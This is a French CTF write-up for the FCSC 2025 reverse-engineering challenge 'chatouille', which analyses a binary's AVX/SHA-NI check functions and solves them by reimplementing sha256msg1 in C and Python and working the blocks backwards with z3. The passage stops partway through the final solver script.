[{"content":"vous pouvez retrouver le binaire joint avec le chall ici\nDécouverte du challenge Dans ce write-up, nous allons explorer un challenge de reverse engineering axé sur l\u0026rsquo;analyse d\u0026rsquo;un binaire utilisant des instructions AVX (Advanced Vector Extensions). J\u0026rsquo;ai passé (perdu ?) énormément de temps sur ce challenge en l\u0026rsquo;abordant de la mauvaise façon.\nAnalyse du binaire La fonction principale est plutôt simple, celle-ci va lire une entrée utilisateur de 128 octets, verifier que la taille de celle-ci est de 118 octets et définir des valeurs aux indexs 0x76, 0x7E et 0x7F de notre buffer.\nEnsuite elle va appeler 2 fonctions avec entrée notre binaire qui doivent chacune retourner 0.\nint __fastcall main(int argc, const char **argv, const char **envp) { int v3; // eax int v4; // edx int v5; // eax unsigned __int8 v7[128]; // [rsp+0h] [rbp-88h] BYREF memset(v7, 0, sizeof(v7)); v3 = read(0, v7, 0x80uLL); if ( v3 \u0026lt;= 0 ) { perror(\u0026#34;read\u0026#34;); exit(1); } v4 = v3; v5 = v3 - 1; if ( v7[v5] == 10 ) { v7[v5] = 0; v4 = v5; } if ( v4 != 118 || (v7[0x76] = 0x80, *(_WORD *)\u0026amp;v7[0x7E] = 0xB003, !shellcode_1((__int64)v7)) || !shellcode_2((__int64)v7) ) { puts(\u0026#34;:(\u0026#34;); exit(0); } puts(\u0026#34;\\\\o/\u0026#34;); return 0; } Analyse de la première fonction Lorsque l\u0026rsquo;on ouvre la fonction, IDA ne parvient pas à produire une décompilation lisible pour cette fonction. La majorité du code est restituée en tant que séquence d\u0026rsquo;instructions assembleur brutes, sans traduction en C.\n_BOOL8 __fastcall shellcode_1(__int64 _RDI) { __asm { vmovdqa xmm7, cs:xmmword_7010 vmovdqa xmm0, cs:xmmword_7120 vmovdqa xmm13, cs:xmmword_7130 vmovdqu xmm5, xmmword ptr [rdi] vmovdqa xmm12, cs:xmmword_7020 vmovdqu xmm2, xmmword ptr [rdi+10h] vpalignr xmm14, xmm0, xmm13, 8 vpshufb xmm15, xmm5, xmm7 vmovdqu xmm6, xmmword ptr [rdi+20h] vpblendw xmm13, xmm13, xmm0, 0F0h vmovdqu xmm4, xmmword ptr [rdi+30h] vpaddd xmm0, xmm15, xmm12 vmovdqa xmm1, xmm13 vmovdqa xmm3, xmm14 vpshufb xmm6, xmm6, xmm7 sha256rnds2 xmm1, xmm14, xmm0 vmovdqa xmm11, cs:xmmword_7030 vpshufb xmm2, xmm2, xmm7 vpshufb xmm4, xmm4, xmm7 vpshufd xmm0, xmm0, 0Eh vmovdqa xmm10, cs:xmmword_7040 sha256msg1 xmm15, xmm2 vpalignr xmm8, xmm4, xmm6, 4 sha256rnds2 xmm3, xmm1, xmm0 vpaddd xmm0, xmm2, xmm11 vmovdqa xmm9, cs:xmmword_7050 sha256rnds2 xmm1, xmm3, xmm0 vpaddd xmm5, xmm15, xmm8 vpshufd xmm0, xmm0, 0Eh sha256msg2 xmm5, xmm4 sha256rnds2 xmm3, xmm1, xmm0 vpaddd xmm0, xmm6, xmm10 vpalignr xmm15, xmm5, xmm4, 4 sha256rnds2 xmm1, xmm3, xmm0 sha256msg1 xmm2, xmm6 vpshufd xmm0, xmm0, 0Eh vpaddd xmm2, xmm2, xmm15 sha256msg1 xmm6, xmm4 sha256rnds2 xmm3, xmm1, xmm0 [...] vpshufd xmm0, xmm0, 0Eh sha256msg2 xmm12, xmm13 sha256rnds2 xmm4, xmm2, xmm0 vpaddd xmm0, xmm12, cs:xmmword_70B0 vpalignr xmm9, xmm12, xmm13, 4 sha256msg1 xmm13, xmm12 vpaddd xmm11, xmm11, xmm9 sha256rnds2 xmm2, xmm4, xmm0 vpshufd xmm0, xmm0, 0Eh sha256msg2 xmm11, xmm12 sha256rnds2 xmm4, xmm2, xmm0 vpaddd xmm0, xmm11, cs:xmmword_70C0 vpalignr xmm3, xmm11, xmm12, 4 sha256msg1 xmm12, xmm11 vpaddd xmm10, xmm10, xmm3 sha256rnds2 xmm2, xmm4, xmm0 vpshufd xmm0, xmm0, 0Eh sha256msg2 xmm10, xmm11 sha256rnds2 xmm4, xmm2, xmm0 vpaddd xmm0, xmm10, cs:xmmword_70D0 vpalignr xmm9, xmm10, xmm11, 4 sha256msg1 xmm11, xmm10 vpaddd xmm13, xmm13, xmm9 sha256rnds2 xmm2, xmm4, xmm0 vpshufd xmm0, xmm0, 0Eh sha256msg2 xmm13, xmm10 sha256rnds2 xmm4, xmm2, xmm0 vpaddd xmm0, xmm13, xmm8 vpalignr xmm8, xmm13, xmm10, 4 sha256msg1 xmm10, xmm13 vpaddd xmm12, xmm12, xmm8 sha256rnds2 xmm2, xmm4, xmm0 vpshufd xmm0, xmm0, 0Eh sha256msg2 xmm12, xmm13 sha256rnds2 xmm4, xmm2, xmm0 vpaddd xmm0, xmm12, xmm15 vpalignr xmm15, xmm12, xmm13, 4 vpaddd xmm11, xmm11, xmm15 sha256rnds2 xmm2, xmm4, xmm0 vpshufd xmm0, xmm0, 0Eh sha256msg2 xmm11, xmm12 sha256rnds2 xmm4, xmm2, xmm0 vpaddd xmm0, xmm11, xmm5 vpalignr xmm5, xmm11, xmm12, 4 vpaddd xmm3, xmm10, xmm5 sha256rnds2 xmm2, xmm4, xmm0 vpshufd xmm0, xmm0, 0Eh sha256msg2 xmm3, xmm11 sha256rnds2 xmm4, xmm2, xmm0 vpaddd xmm0, xmm3, xmm6 sha256rnds2 xmm2, xmm4, xmm0 vpshufd xmm0, xmm0, 0Eh sha256rnds2 xmm4, xmm2, xmm0 vpaddd xmm1, xmm2, xmm1 vpaddd xmm6, xmm4, xmm14 vpshufd xmm2, xmm1, 0B1h vpshufd xmm14, xmm6, 1Bh vpblendw xmm4, xmm14, xmm2, 0F0h vpalignr xmm10, xmm2, xmm14, 8 vpshufb xmm9, xmm4, xmm7 vpxor xmm13, xmm9, cs:xmmword_90C0 vpshufb xmm7, xmm10, xmm7 vptest xmm13, xmm13 } if ( !_ZF ) return 0LL; __asm { vpxor xmm8, xmm7, cs:xmmword_90D0 vptest xmm8, xmm8 } return _ZF != 0; } Lorsque je tombe sur ce shellcode conséquent, j\u0026rsquo;ai une seule idée qui me vient tête : il va probablement falloir utiliser de l\u0026rsquo;execution symbolique pour résoudre le shellcode (spoil : non).\nJe me lance alors durant plusieurs jours dans la résolution de cette unique fonction (il aurait peut être été plus intelligent de jeter un oeil à la deuxième fonction).\nLe fait qu\u0026rsquo;IDA ne supporte pas cette instruction n\u0026rsquo;est pas une exception : je n\u0026rsquo;ai trouvé aucun outil d\u0026rsquo;exécution symbolique capable de l\u0026rsquo;interpréter. Je commence donc à essayer de résoudre le challenge avec Miasm, puis avec angr, puis avec Triton, puis en réimplémentant les instructions sha256 en C et recréant un binaire sur lequel j\u0026rsquo;allais pouvoir faire de l\u0026rsquo;execution symbolique avec angr \u0026hellip; allant jusqu\u0026rsquo;a réimplémenter mon propre moteur d\u0026rsquo;exec symbolique avec capstone et z3 ! Tout ça en vain.\nAprès avoir passé beaucoup de temps sur la première fonction sans succès, j\u0026rsquo;ai décidé de m\u0026rsquo;attaquer à la seconde. Ce n’est qu’après un long moment, en lisant la documentation Intel sur les instructions sha, que j’ai remarqué que le code fourni en exemple, implémentant SHA-256 avec des instructions AVX, ressemblait fortement à celui de ma première fonction. En réalité, celle-ci ne faisait qu\u0026rsquo;un simple SHA-256 de l\u0026rsquo;input avant de le comparer à un hash stocké en mémoire ! Beaucoup de temps perdu (et de cheveux), certes, mais cela m\u0026rsquo;aura permis d’apprendre énormément de choses sur l’exécution symbolique.\nDe toute façon, si j\u0026rsquo;avais réussi à inverser un SHA-256 avec Z3, je serais probablement en train de négocier un poste à la NSA à l\u0026rsquo;heure qu\u0026rsquo;il est.\nAnalyse de la seconde fonction Nous allons maintenant nous intéresser à la fonction clé du challenge.\nCelle-ci est presque entièrement constitué de 2 opérations :\nvpshufd sha256msg1 Basiquement, cette fonction ressemble à ça. Je ne vous ai pas mis l\u0026rsquo;intégralité du code mais celui-ci est très très long et répétitif.\nvmovdqu xmm6, xmmword ptr [rdi] vmovdqu xmm0, xmmword ptr [rdi+10h] vmovdqu xmm10, xmmword ptr [rdi+20h] vpshufd xmm1, xmm6, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm0, xmm6 vpshufd xmm2, xmm1, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm0, xmm1 vpshufd xmm3, xmm2, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm0, xmm2 vmovdqu xmm2, xmmword ptr [rdi+30h] vpshufd xmm4, xmm3, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm0, xmm3 vpshufd xmm5, xmm4, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm0, xmm4 vpshufd xmm7, xmm5, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm0, xmm5 vpshufd xmm8, xmm7, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm0, xmm7 sha256msg1 xmm0, xmm8 vpshufd xmm9, xmm8, 39h ; \u0026#39;9\u0026#39; vpshufd xmm11, xmm0, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm10, xmm0 vpshufd xmm12, xmm11, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm10, xmm11 vpshufd xmm13, xmm12, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm10, xmm12 vpshufd xmm14, xmm13, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm10, xmm13 vmovdqu xmm13, xmmword ptr [rdi+40h] vpshufd xmm15, xmm14, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm10, xmm14 vpshufd xmm6, xmm15, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm10, xmm15 vpshufd xmm0, xmm6, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm10, xmm6 sha256msg1 xmm10, xmm0 vpshufd xmm8, xmm0, 39h ; \u0026#39;9\u0026#39; vpshufd xmm1, xmm10, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm2, xmm10 vpshufd xmm3, xmm1, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm2, xmm1 vpshufd xmm4, xmm3, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm2, xmm3 vpshufd xmm5, xmm4, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm2, xmm4 vpshufd xmm7, xmm5, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm2, xmm5 vpshufd xmm10, xmm7, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm2, xmm7 vmovdqu xmm7, xmmword ptr [rdi+50h] vpshufd xmm11, xmm10, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm2, xmm10 sha256msg1 xmm2, xmm11 vpshufd xmm12, xmm11, 39h ; \u0026#39;9\u0026#39; vpshufd xmm14, xmm2, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm13, xmm2 vpshufd xmm15, xmm14, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm13, xmm14 vpshufd xmm6, xmm15, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm13, xmm15 vpshufd xmm0, xmm6, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm13, xmm6 vpshufd xmm2, xmm0, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm13, xmm0 vmovdqu xmm0, xmmword ptr [rdi+60h] vpshufd xmm1, xmm2, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm13, xmm2 vpshufd xmm3, xmm1, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm13, xmm1 sha256msg1 xmm13, xmm3 vpshufd xmm10, xmm3, 39h ; \u0026#39;9\u0026#39; vpshufd xmm4, xmm13, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm7, xmm13 vpshufd xmm5, xmm4, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm7, xmm4 vpshufd xmm11, xmm5, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm7, xmm5 vpshufd xmm13, xmm11, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm7, xmm11 vpshufd xmm14, xmm13, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm7, xmm13 vpshufd xmm15, xmm14, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm7, xmm14 vpshufd xmm6, xmm15, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm7, xmm15 vmovdqu xmm15, xmmword ptr [rdi+70h] sha256msg1 xmm7, xmm6 vpshufd xmm5, xmm6, 39h ; \u0026#39;9\u0026#39; vpshufd xmm2, xmm7, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm0, xmm7 vpshufd xmm1, xmm2, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm0, xmm2 vpshufd xmm3, xmm1, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm0, xmm1 vpshufd xmm7, xmm3, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm0, xmm3 vpshufd xmm4, xmm7, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm0, xmm7 vpshufd xmm11, xmm4, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm0, xmm4 vpshufd xmm13, xmm11, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm0, xmm11 sha256msg1 xmm0, xmm13 vpshufd xmm14, xmm13, 39h ; \u0026#39;9\u0026#39; vpshufd xmm6, xmm0, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm15, xmm0 sha256msg1 xmm15, xmm6 vpshufd xmm0, xmm6, 39h ; \u0026#39;9\u0026#39; vpshufd xmm2, xmm0, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm15, xmm0 vpshufd xmm1, xmm2, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm15, xmm2 vpshufd xmm3, xmm1, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm15, xmm1 vpshufd xmm7, xmm3, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm15, xmm3 [...] # 3875 lignes de vpshufd et sha256msg1 vpshufd xmm9, xmm2, 39h ; \u0026#39;9\u0026#39; vpxor xmm9, xmm9, cs:xmmword_9040 sha256msg1 xmm12, xmm8 vpshufd xmm8, xmm8, 39h ; \u0026#39;9\u0026#39; vpshufd xmm1, xmm8, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm12, xmm8 vpshufd xmm3, xmm1, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm12, xmm1 vpshufd xmm4, xmm3, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm12, xmm3 vpshufd xmm10, xmm4, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm12, xmm4 vpshufd xmm6, xmm10, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm12, xmm10 vpshufd xmm15, xmm6, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm12, xmm6 sha256msg1 xmm12, xmm15 vpshufd xmm0, xmm15, 39h ; \u0026#39;9\u0026#39; vpxor xmm0, xmm0, cs:xmmword_9050 sha256msg1 xmm13, xmm12 vpshufd xmm12, xmm12, 39h ; \u0026#39;9\u0026#39; vpshufd xmm2, xmm12, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm13, xmm12 vpshufd xmm8, xmm2, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm13, xmm2 vpshufd xmm1, xmm8, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm13, xmm8 vpshufd xmm3, xmm1, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm13, xmm1 vpshufd xmm4, xmm3, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm13, xmm3 vpshufd xmm10, xmm4, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm13, xmm4 sha256msg1 xmm13, xmm10 vpshufd xmm15, xmm10, 39h ; \u0026#39;9\u0026#39; vpxor xmm15, xmm15, cs:xmmword_9060 sha256msg1 xmm5, xmm13 vpshufd xmm13, xmm13, 39h ; \u0026#39;9\u0026#39; vpshufd xmm6, xmm13, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm5, xmm13 vpshufd xmm12, xmm6, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm5, xmm6 vpshufd xmm2, xmm12, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm5, xmm12 vpshufd xmm8, xmm2, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm5, xmm2 vpshufd xmm1, xmm8, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm5, xmm8 vpshufd xmm3, xmm1, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm5, xmm1 sha256msg1 xmm5, xmm3 vpshufd xmm10, xmm3, 39h ; \u0026#39;9\u0026#39; vpxor xmm10, xmm10, cs:xmmword_9070 sha256msg1 xmm14, xmm5 vpshufd xmm5, xmm5, 39h ; \u0026#39;9\u0026#39; vpshufd xmm4, xmm5, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm14, xmm5 vpshufd xmm13, xmm4, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm14, xmm4 vpshufd xmm6, xmm13, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm14, xmm13 vpshufd xmm12, xmm6, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm14, xmm6 vpshufd xmm2, xmm12, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm14, xmm12 vpshufd xmm8, xmm2, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm14, xmm2 sha256msg1 xmm14, xmm8 vpshufd xmm1, xmm8, 39h ; \u0026#39;9\u0026#39; vpxor xmm1, xmm1, cs:xmmword_9080 sha256msg1 xmm11, xmm14 vpshufd xmm14, xmm14, 39h ; \u0026#39;9\u0026#39; vpshufd xmm3, xmm14, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm11, xmm14 vpshufd xmm5, xmm3, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm11, xmm3 vpshufd xmm4, xmm5, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm11, xmm5 vpshufd xmm13, xmm4, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm11, xmm4 vpshufd xmm6, xmm13, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm11, xmm13 vpshufd xmm12, xmm6, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm11, xmm6 vpor xmm6, xmm0, xmm9 sha256msg1 xmm11, xmm12 vpshufd xmm2, xmm12, 39h ; \u0026#39;9\u0026#39; vpxor xmm2, xmm2, cs:xmmword_9090 sha256msg1 xmm7, xmm11 vpshufd xmm11, xmm11, 39h ; \u0026#39;9\u0026#39; vpshufd xmm8, xmm11, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm7, xmm11 vpor xmm11, xmm6, xmm1 vpshufd xmm14, xmm8, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm7, xmm8 vpshufd xmm3, xmm14, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm7, xmm14 vpshufd xmm5, xmm3, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm7, xmm3 vpor xmm3, xmm15, xmm10 vpshufd xmm4, xmm5, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm7, xmm5 vpor xmm5, xmm3, xmm2 vpshufd xmm13, xmm4, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm7, xmm4 vpshufd xmm12, xmm13, 39h ; \u0026#39;9\u0026#39; sha256msg1 xmm7, xmm13 vpxor xmm8, xmm12, cs:xmmword_90A0 vpxor xmm7, xmm7, cs:xmmword_90B0 vpxor xmm12, xmm12, xmm12 vpor xmm14, xmm11, xmm8 vpor xmm4, xmm5, xmm7 vpor xmm13, xmm14, xmm4 vpcmpeqd xmm0, xmm13, xmm12 vpmovmskb eax, xmm0 cmp eax, 0FFFFh setz dl movzx eax, dl retn L\u0026rsquo;instruction vpshufd L\u0026rsquo;instruction vpshufd (Vector Packed Shuffle Doublewords) sert à réorganiser les éléments d\u0026rsquo;un vecteur de 128 ou 256 bits. Chaque élément du vecteur est un entier de 32 bits (appelé \u0026ldquo;doubleword\u0026rdquo;). L\u0026rsquo;opération utilise un masque de contrôle pour déterminer comment les éléments doivent être mélangés : pour chaque position dans le résultat, le masque indique quel élément source doit être copié.\nConcrètement, vpshufd est utilisée pour :\nPermuter les éléments d\u0026rsquo;un vecteur selon un ordre précis, Dupliquer certains éléments si nécessaire, Réorganiser les données pour des calculs parallèles plus efficaces. Elle est très utilisée dans le traitement de données vectorielles, la cryptographie, et l\u0026rsquo;optimisation des algorithmes SIMD.\nSource: ChatGPT\nDans notre cas l\u0026rsquo;instruction est toujours appelé avec l\u0026rsquo;argument 0x39, on peut donc la traduire par simple rotation de 32 bits vers la droite sur le registre en entrée.\nDe plus, il est intéressant de noter que toutes les 4 appels à vpshufd, la valeur retrouve son état initial.\nL\u0026rsquo;instruction sha256msg1 D\u0026rsquo;après la document de intel, sha256msg1 (ainsi que sa soeur sha256msg2) semble servir à aider à faciliter génération du message schedule dans SHA-256. sert à faciliter la génération du message schedule dans SHA-256. Ne connaissant pas en détail le fonctionnement interne de SHA-256, cela reste un peu flou pour moi. Toutefois, pour ce challenge, il suffit de comprendre comment fonctionne cette instruction et non pas les autres.\nVoici un schéma du fonctionnement de celle-ci :\nOn peut très facilement la réimplémenter de la manière suivante :\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;x86intrin.h\u0026gt; #define ROTR(x,y) (((x \u0026amp; 0xffffffff) \u0026gt;\u0026gt; (y \u0026amp; 31)) | (x \u0026lt;\u0026lt; (32 - (y \u0026amp; 31)))) \u0026amp; 0xffffffff #define SHR(x,n) ((x) \u0026gt;\u0026gt; (n)) static inline uint32_t sigma0(uint32_t x) { return ROTR(x, 7) ^ ROTR(x, 18) ^ SHR(x, 3); } __m128i sha256msg1_manual(__m128i a, __m128i b) { uint32_t x[4], y[4]; _mm_storeu_si128((__m128i*)x, a); // split la valeur sur 128 bits en blocs de 32 bits. _mm_storeu_si128((__m128i*)y, b); uint32_t r[4]; r[0] = sigma0(x[1]) + x[0]; r[1] = sigma0(x[2]) + x[1]; r[2] = sigma0(x[3]) + x[2]; r[3] = sigma0(y[0]) + x[3]; return _mm_set_epi32(r[3], r[2], r[1], r[0]); } void print_xmm(__m128i v, const char* label) { uint8_t bytes[16]; _mm_storeu_si128((__m128i*)bytes, v); printf(\u0026#34;%s: 0x\u0026#34;, label); for (int i = 15; i \u0026gt;= 0; i--) { printf(\u0026#34;%02X\u0026#34;, bytes[i]); } printf(\u0026#34;\\n\u0026#34;); } int main() { /* on vient tester que notre implémentation retourne bien les mêmes résultats que l\u0026#39;instruction AVX */ __m128i xmm0; __m128i xmm6; xmm0 = _mm_set_epi32(0x45454545, 0x44444444, 0x42424242, 0x41414141); xmm6 = _mm_set_epi32(0x38373635, 0x34333231, 0x48474645, 0x44434241); xmm0 = sha256msg1_manual(xmm0, xmm6); // implém custom print_xmm(xmm0, \u0026#34;sha256msg1 made home\u0026#34;); xmm0 = _mm_set_epi32(0x45454545, 0x44444444, 0x42424242, 0x41414141); xmm6 = _mm_set_epi32(0x38373635, 0x34333231, 0x48474645, 0x44434241); xmm0 = _mm_sha256msg1_epu32(xmm0, xmm6); // instruction AVX print_xmm(xmm0, \u0026#34;sha256msg1 official\u0026#34;); return 0; } En compilant et exécutant le code de test, on peut vérifier que notre implémentation de sha256msg1 est correcte :\n╭─trikkss@arch-linux ~/ctf/FCSC-2025/reverse/chatouille/tests ╰─➤ gcc -mavx -msha test.c -o test ╭─trikkss@arch-linux ~/ctf/FCSC-2025/reverse/chatouille/tests ╰─➤ ./test sha256msg1 made home: 0x9FD6052117B7B7B7D35353535D9D9D9D sha256msg1 official: 0x9FD6052117B7B7B7D35353535D9D9D9D Compréhension de l\u0026rsquo;algorithme Il faut maintenant comprendre comment sont utilisées ces deux instructions.\nHeureusement, après un long moment à contempler cette fonction les yeux dans le vide, j\u0026rsquo;ai fini par repérer un pattern. En effet, la fonction peut être divisé en bloc de 8 appels à vpshufd et 8 appels à sha256msg1.\nSi l\u0026rsquo;on prend ce premier bloc, on se rend compte que celui-ci prend 2 bloc de 128 bits de notre entrée utilisateur et va ensuite appliquer 8 vpshufd puis effectuer 8 sha256msg1 avec chacun des outputs du vpshufd.\nVoici une partie simplifiée et commenté d\u0026rsquo;un bloc du shellcode.\n// récupère d2 blocs de 16 octets vmovdqu xmm6, xmmword ptr [rdi] vmovdqu xmm0, xmmword ptr [rdi+10h] // applique les transformations sur RDI vpshufd xmm1, xmm6, 39h vpshufd xmm2, xmm1, 39h vpshufd xmm3, xmm2, 39h vpshufd xmm4, xmm3, 39h vpshufd xmm5, xmm4, 39h vpshufd xmm7, xmm5, 39h vpshufd xmm8, xmm7, 39h vpshufd xmm9, xmm8, 39h // effectue 8 sha256msg1 sur xmm0 avec les transfo précédentes sha256msg1 xmm0, xmm6 sha256msg1 xmm0, xmm1 sha256msg1 xmm0, xmm2 sha256msg1 xmm0, xmm3 sha256msg1 xmm0, xmm4 sha256msg1 xmm0, xmm5 sha256msg1 xmm0, xmm7 sha256msg1 xmm0, xmm8 Ce bloc est ensuite réapliqué pour chaque bloc de 16 octets de notre entré utilisateur avec cette fois le résultat du bloc précédent comme deuxième opérande pour sha256msg1.\nVoici un schéma illustrant les 8 premiers blocs :\nLa sortie de chaque bloc (en rose) sert comme entrée à au prochain bloc.\nMais une fois que l\u0026rsquo;on a itéré sur toute notre entrée utilisateur, comment cela se passe-t-il ensuite ?\nEt bien c\u0026rsquo;est tout simple (j\u0026rsquo;ai mis au moins 2h à comprendre), le prochain bloc prend en deuxième entrée le résultat du bloc n-8.\nEt l\u0026rsquo;on va appliqué la même opération beaucoup de fois sur nos blocs jusqu\u0026rsquo;a la fin du shellcode.\nArrivé à la fin du shellcode, la sortie des 8 derniers blocs va être xoré avec des valeurs sur 128 bits. Afin que le shellcode retourne 0, il faut que les 8 derniers blocs soient égaux aux 8 valeurs par lesquelles ils sont xoré.\nknown_values = [ 0x27E2993E7DDB9BCE388260CED6DF027E, # dernier bloc 0xAB509EB2143D13035F595D84BF7A1DBF, # avant dernier 0x67172D37B77DAEFE99DB1D1FF04FBED5, # avant avant dernier 0x4325F6DFDC17B3D93A437A2FD174192F, # etc. 0xB6CEB5305C48B5C137C1EEC542DD7AB5, 0x36DE1DABA4D0C410A59ABC08D9270088, 0x4FB98600728660ADC7EB49ABF5F4BB97, 0xBD7A8C92FE4A7BD964145C1B415E27FE ] Voici une illustration du dernier bloc, en jaune nous pouvons retrouver les valeurs connues (et en bleu les inconnues, si jamais le point d\u0026rsquo;interrogation n\u0026rsquo;était pas assez explicite).\nOn peut donc supposer que pour résoudre ce challenge il va falloir partir des 8 dernières valeurs connues et remonter les blocs jusqu\u0026rsquo;a arriver au premier.\nPour se faire, j\u0026rsquo;ai implémenter nos blocs en python afin de les résoudres à l\u0026rsquo;aide de z3.\nRésolution avec z3 Voici mon implémentation d\u0026rsquo;un bloc avec z3 en python :\nfrom z3 import * def S0(x): return RotateRight(x,7) ^ RotateRight(x,18) ^ LShR(x,3) def sha256msg1(src1, src2): X = [ Extract(31, 0, src1), Extract(63, 32, src1), Extract(95, 64, src1), Extract(127,96, src1), ] Y = [ Extract(31, 0, src2), Extract(63, 32, src2), Extract(95, 64, src2), Extract(127,96, src2), ] mask32 = BitVecVal(0xFFFFFFFF, 32) R0 = (S0(X[1]) + X[0]) \u0026amp; mask32 R1 = (S0(X[2]) + X[1]) \u0026amp; mask32 R2 = (S0(X[3]) + X[2]) \u0026amp; mask32 R3 = (S0(Y[0]) + X[3]) \u0026amp; mask32 return Concat(R3, R2, R1, R0) def block(src1, src2): out = src1 for i in range(8): out = sha256msg1(out, RotateRight(src2, 32*i)) return out On peut ainsi retrouver notre première inconue en partant de la fin en appelant le code suivant :\ns = Solver() s.add(block(BitVec(\u0026#39;x\u0026#39;, 128), BitVecVal(0xAB509EB2143D13035F595D84BF7A1DBF, 128)) == BitVecVal(0x27E2993E7DDB9BCE388260CED6DF027E, 128)) if s.check() == sat: print(s.model()) else: print(\u0026#34;no solution found ...\u0026#34;) Maintenant il nous reste plus qu\u0026rsquo;a remonter les blocs jusqu\u0026rsquo;a trouver notre valeur initiale !\nPour ça on va compter le nombre de fois qu\u0026rsquo;apparait l\u0026rsquo;instruction sha256msg1 dans le shellcode.\n╭─trikkss@arch-linux ~/ctf/FCSC-2025/reverse/chatouille ╰─➤ cat shellcode2.txt | grep sha256msg1 | wc -l 2040 Sachant que chaque bloc utilise 8 fois l\u0026rsquo;instruction on peut donc diviser par 8 ce qui nous donne 255 blocs à remonter.\nVoici donc le script final :\nfrom z3 import * def S0(x): return RotateRight(x,7) ^ RotateRight(x,18) ^ LShR(x,3) def sha256msg1(src1, src2): X = [ Extract(31, 0, src1), # X[0] Extract(63, 32, src1), # X[1] Extract(95, 64, src1), # X[2] Extract(127,96, src1), # X[3] ] Y = [ Extract(31, 0, src2), # Y[0] Extract(63, 32, src2), # Y[1] Extract(95, 64, src2), # Y[2] Extract(127,96, src2), # Y[3] ] mask32 = BitVecVal(0xFFFFFFFF, 32) R0 = (S0(X[1]) + X[0]) \u0026amp; mask32 R1 = (S0(X[2]) + X[1]) \u0026amp; mask32 R2 = (S0(X[3]) + X[2]) \u0026amp; mask32 R3 = (S0(Y[0]) + X[3]) \u0026amp; mask32 return Concat(R3, R2, R1, R0) def block(src1, src2): out = src1 for i in range(8): out = sha256msg1(out, RotateRight(src2, 32*i)) return out round_values = [ 0x27E2993E7DDB9BCE388260CED6DF027E, 0xAB509EB2143D13035F595D84BF7A1DBF, 